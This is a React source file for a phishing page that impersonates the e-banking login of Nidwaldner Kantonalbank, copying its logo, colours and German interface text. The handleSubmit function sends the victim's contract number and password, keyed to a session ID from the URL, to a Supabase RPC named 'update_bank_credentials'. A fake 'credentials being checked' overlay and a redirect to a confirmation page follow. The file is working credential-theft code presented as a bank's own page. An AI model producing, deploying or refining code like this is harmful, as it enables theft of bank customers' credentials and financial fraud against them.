import { useState, useEffect, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff } from "lucide-react";
import logoAsset from "@/assets/nidwaldner-kantonalbank-logo.png.asset.json";
import slideAsset from "@/assets/nkb-sperrfunktion.jpg.asset.json";

const RED = "#e30613";
const BG = "#f4f4f4";

const slides = [
  {
    image: slideAsset.url,
    title: "Neue Sperrfunktion «E-Banking und Mobile Banking»",
    text: "Seit kurzem ist auf der Anmeldemaske die Funktion «E-Banking/Mobile Banking/TWINT Zugang sperren» verfügbar. Dadurch haben Sie...",
    linkText: "Mehr erfahren",
  },
];

const ChNidwaldnerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [activeSlide] = useState(0);
  const touchStartX = useRef(0);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Nidwaldner Kantonalbank – E-Banking", logoAsset.url);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const inputStyle = { backgroundColor: "#eeeeee" };
  const inputClass =
    "w-full px-3 py-2 text-[15px] rounded-[5px] border-0 outline-none focus:outline-none focus:ring-0 focus:border-0";

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col" style={{ backgroundColor: BG }}>
        <main className="flex-1 px-0 md:px-4">
          <div className="w-full md:max-w-[988px] mx-auto mt-0 md:mt-16 bg-white overflow-hidden md:shadow-sm md:rounded-lg md:aspect-[988/700] md:border md:border-[#d9d9d9]">
            <div className="flex flex-col md:flex-row h-full">
              {/* Left column: header + form */}
              <div className="md:w-1/2 flex flex-col">
                <div className="flex items-center" style={{ height: 40, paddingLeft: 24, paddingRight: 24 }}>
                  <img src={logoAsset.url} alt="Nidwaldner Kantonalbank" className="h-[30px]" />
                </div>
                <div className="flex h-[3px] md:hidden">
                  <div className="flex-1" style={{ backgroundColor: RED }} />
                  <div className="flex-1 bg-[#ddd]" />
                </div>
                <div className="hidden md:block" style={{ height: 3, backgroundColor: RED }} />

                <div className="px-8 py-8 flex flex-col flex-1">
                  <h1 className="text-[22px] md:text-[26px] font-semibold text-black mb-2">Willkommen</h1>
                  <p className="text-[14px] mb-8" style={{ color: "#666" }}>
                    Melden Sie sich an, um fortzufahren.
                  </p>

                  <div className="mb-5">
                    <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                      Vertragsnummer
                    </label>
                    <input
                      type="text"
                      value={vertragsnummer}
                      onChange={(e) => setVertragsnummer(e.target.value)}
                      className={inputClass}
                      style={inputStyle}
                    />
                  </div>

                  <div className="mb-8">
                    <label className="block text-[13px] mb-1" style={{ color: "#555" }}>
                      Passwort
                    </label>
                    <div className="relative">
                      <input
                        type={showPassword ? "text" : "password"}
                        value={passwort}
                        onChange={(e) => setPasswort(e.target.value)}
                        className={inputClass + " pr-10"}
                        style={inputStyle}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-2 top-1/2 -translate-y-1/2"
                        aria-label="Passwort anzeigen"
                      >
                        {showPassword ? <EyeOff size={18} color="#666" /> : <Eye size={18} color="#666" />}
                      </button>
                    </div>
                  </div>

                  <button
                    onClick={handleSubmit}
                    className="mx-auto w-full max-w-[110px] py-2.5 text-white font-semibold text-[15px] rounded-full"
                    style={{ backgroundColor: RED }}
                  >
                    Weiter
                  </button>

                  <a href="#" className="mt-4 text-center text-[14px]" style={{ color: RED }}>
                    E-Banking und TWINT sperren
                  </a>

                  <div className="flex-1" />

                  <a href="#" className="mt-4 md:mt-10 text-center text-[14px]" style={{ color: RED }}>
                    Brauchen Sie Hilfe?
                  </a>
                </div>
              </div>

              {/* Right column: carousel */}
              <div className="md:w-1/2 flex flex-col">
                <div className="hidden md:block" style={{ height: 40, borderBottom: "2px solid #ddd" }} />

                <div
                  className="relative group flex-1 min-h-[360px] overflow-hidden"
                  onTouchStart={(e) => { touchStartX.current = e.touches[0].clientX; }}
                  onTouchEnd={(e) => { void touchStartX.current; e.changedTouches[0].clientX; }}
                >
                  {slides.map((s, i) => (
                    <img
                      key={i}
                      src={s.image}
                      alt={s.title}
                      className="absolute inset-0 w-full h-full object-cover transition-opacity duration-700"
                      style={{ opacity: i === activeSlide ? 1 : 0 }}
                    />
                  ))}

                  <div
                    className="absolute left-4 right-4 bottom-4 px-5 py-4 backdrop-blur-md rounded-md"
                    style={{ backgroundColor: "rgba(245,245,245,0.55)" }}
                  >
                    <h3 className="font-bold text-[13px] mb-1" style={{ color: RED }}>
                      {slides[activeSlide].title}
                    </h3>
                    <p className="text-[13px] leading-snug mb-1" style={{ color: "#222" }}>
                      {slides[activeSlide].text}
                    </p>
                    <a href="#" className="text-[13px] hover:underline" style={{ color: RED }}>
                      {slides[activeSlide].linkText}
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer className="mt-0 md:mt-12" style={{ backgroundColor: BG }}>
          <div
            className="max-w-[1100px] mx-auto px-8 py-4 text-[13px] flex flex-col items-center gap-1 md:flex-row md:justify-between md:flex-row-reverse"
            style={{ color: "#333" }}
          >
            <a
              href="https://www.nkb.ch/"
              target="_blank"
              rel="noopener noreferrer"
              className="transition-colors hover:underline"
              style={{ color: RED }}
            >
              Rechtliche Hinweise
            </a>
            <span>© Nidwaldner Kantonalbank 2026</span>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChNidwaldnerKantonalbank;
